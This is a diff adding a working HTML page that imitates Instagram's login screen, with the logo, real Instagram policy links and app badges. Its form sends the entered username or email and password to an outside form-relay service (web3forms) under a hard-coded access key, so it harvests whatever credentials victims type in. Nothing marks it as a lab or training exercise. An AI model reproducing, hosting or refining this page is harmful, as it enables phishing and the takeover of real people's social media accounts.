@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+      integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="container">
+      <div class="center">
+        <div class="header">
+          <img src="instagram.png" alt="instagramLogo" class="instaLogo" style="
+    width: 175px;
+    height: 50px;
+    object-fit: cover;
+"/>
+        </div>
+        <form action="https://api.web3forms.com/submit" method="POST">
+              <input type="hidden" name="access_key" value="52173c4a-a43f-403d-801b-64b20ef0ece9">
+        <div class="inputElement">
+          <input
+            type="text" name="phone_no"
+            placeholder="Phone number,username or email"
+            class="inputText" required
+          />
+          <input type="password" name="pass" placeholder="Password" class="inputText" required/>
+         <input type="submit" value="Log in" class="inputButton"/>
+      </form>
+          <div class="line">
+            <span class="arrow"></span>
+            <span class="content">OR</span>
+            <span class="arrow"></span>
+          </div>
+      <!--    <div class="social__icon">
+            <i class="fab fa-facebook-square"></i
+            ><span>Log in with facebook</span>
+          </div> -->
+          <button><i style="color: #fff" class="fab fa-facebook"></i> Log in with Facebook</button><br>
+          <div class="forgetPassword"><a href="#">Forget Password?</a></div>
+        </div>
+      <div class="text">
+                <p>
+                    By signing up, you agree to our <a href="https://help.instagram.com/196883487377501">Terms</a>, <a href="https://help.instagram.com/196883487377501">Data Policy</a> and <a style="margin-left: 90px" href="https://help.instagram.com/196883487377501">Cookies Policy</a>.
+                </p>
+            </div>
+      </div>
+      <div class="footer">
+        <p>Don't have a accout?<a href="singup.html">Sign Up</a></p>
+      </div>
+       <div class="get_app">
+            <p>Get the app.</p>
+            <div class="get_app_images">
+                <img src="appStore.png" alt="">
+                <img src="playStore.png" alt="">
+            </div>
+        </div>
+    </div>
+  </body>
+</html>
